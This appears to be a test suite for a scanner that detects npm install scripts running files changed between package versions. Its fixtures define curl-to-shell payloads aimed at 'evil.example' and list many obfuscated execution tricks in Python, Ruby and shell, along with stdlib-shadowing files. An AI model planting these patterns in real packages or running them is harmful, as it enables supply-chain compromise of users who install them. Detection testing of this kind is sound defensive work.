import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";
const py = "import os\nos.system('curl evil|sh')\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const pyE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const rbE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "ruby install.rb" }),
  "install.rb": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});

const V = "vars(os)['system']('sh docs/run.sh')";

// A stdlib import also closes the package directory and the native suffixes.
// A command word that is only $X or ${X} widens. N19 still follows the backtick.
// N14, N16, and N17 name one shadow file, so README stays quiet.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["N1 py class body", pyE(`import os\nclass A:\n    ${V}\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N2 py if block", pyE(`import os\nif True:\n    ${V}\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N3 py annotation", pyE(`import os\nx: ${V} = 1\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N4 py list display", pyE(`import os\nx = [${V}]\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N5 py conditional expr", pyE(`import os\nx = 1 if ${V} else 2\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N6 py semicolon", pyE(`import os\nx = 1; ${V}\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N7 py backslash continuation", pyE(`import os\nx = 1 \\\n    + ${V}\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N8 py paren continuation", pyE(`import os\nx = (\n    ${V}\n)\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N9 py def default arg", pyE(`import os\ndef f(a=${V}):\n    pass\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N10 py decorator", pyE(`import os\n@lambda f: ${V}\ndef g():\n    pass\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N11 py with block", pyE(`import os, contextlib\nwith contextlib.suppress(Exception):\n    ${V}\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N12 py assert", pyE(`import os\nassert ${V} == 0\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N13 py try block", pyE(`import os\ntry:\n    ${V}\nexcept Exception:\n    pass\n`, "docs/run.sh"), "docs/run.sh", sh, false],
  ["N14 py stdlib shadow dir", pyE("import json\nprint(1)\n", "json/__init__.py"), "json/__init__.py", py, true],
  ["N15 py stdlib shadow test pkg", pyE("import test\nprint(1)\n", "test/__init__.py"), "test/__init__.py", py, false],
  ["N16 py stdlib shadow .pyc", pyE("import json\nprint(1)\n", "json.pyc"), "json.pyc", "\x00\x00\x00\x00junk", true],
  ["N17 py stdlib shadow .so", pyE("import json\nprint(1)\n", "json.abi3.so"), "json.abi3.so", "\x7fELFjunk", true],
  ["N18 py from-stdlib submodule shadow", pyE("from email import message\nprint(1)\n", "email/message.py"), "email/message.py", py, false],
  ["N19 rb heredoc interpolation", rbE("puts <<~EOS\n  #{`sh docs/run.sh`}\nEOS\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["N20 rb heredoc interp call", rbE("x = <<~EOS\n  #{Kernel.send(:system, 'sh docs/run.sh')}\nEOS\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["N21 sh echo var into sh", shE("X='sh docs/run.sh'\necho \"$X\" | sh\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["N22 sh printf var into bash", shE("X=docs/run.sh\nprintf '. %s\\n' \"$X\" | bash\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["N23 sh var as command", shE("X=docs/run.sh\n$X\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["N24 sh brace group", shE("{ echo hi; sh docs/run.sh; }\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["N25 sh subshell cd mkdir then run", shE("( cd docs && mkdir -p b && sh run.sh )\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["N14 json.so", pyE("import json\nprint(1)\n", "json.so"), "json.so", "\x7fELFjunk", true],
  ["N14 json.pyd", pyE("import json\nprint(1)\n", "json.pyd"), "json.pyd", "MZ", true],
  ["N14 json.abi3.pyd", pyE("import json\nprint(1)\n", "json.abi3.pyd"), "json.abi3.pyd", "MZ", true],
  ["N14 json.cpython so", pyE("import json\nprint(1)\n", "json.cpython-312-darwin.so"), "json.cpython-312-darwin.so", "\x7fELFjunk", true],
  ["N14 json.cpython pyd", pyE("import json\nprint(1)\n", "json.cpython-312-win_amd64.pyd"), "json.cpython-312-win_amd64.pyd", "MZ", true],
  ["N14 json package member", pyE("import json\nprint(1)\n", "json/tool.py"), "json/tool.py", py, true],
  ["N23 ${X} command", shE("X=docs/run.sh\n${X}\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["N23 quoted $X command", shE("X=docs/run.sh\n\"$X\"\n", "docs/run.sh"), "docs/run.sh", sh, false],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}

test("a longer directory name is not a stdlib shadow", () => {
  const base = pyE("import json\nprint(1)\n", "json2/__init__.py");
  expect(hard(base, { ...base, "json2/__init__.py": py })).toEqual([]);
});

test("a single-quoted dollar command is not an expansion", () => {
  const base = shE("X=docs/run.sh\n'$X'\n", "docs/run.sh");
  expect(hard(base, { ...base, "docs/run.sh": sh })).toEqual([]);
});
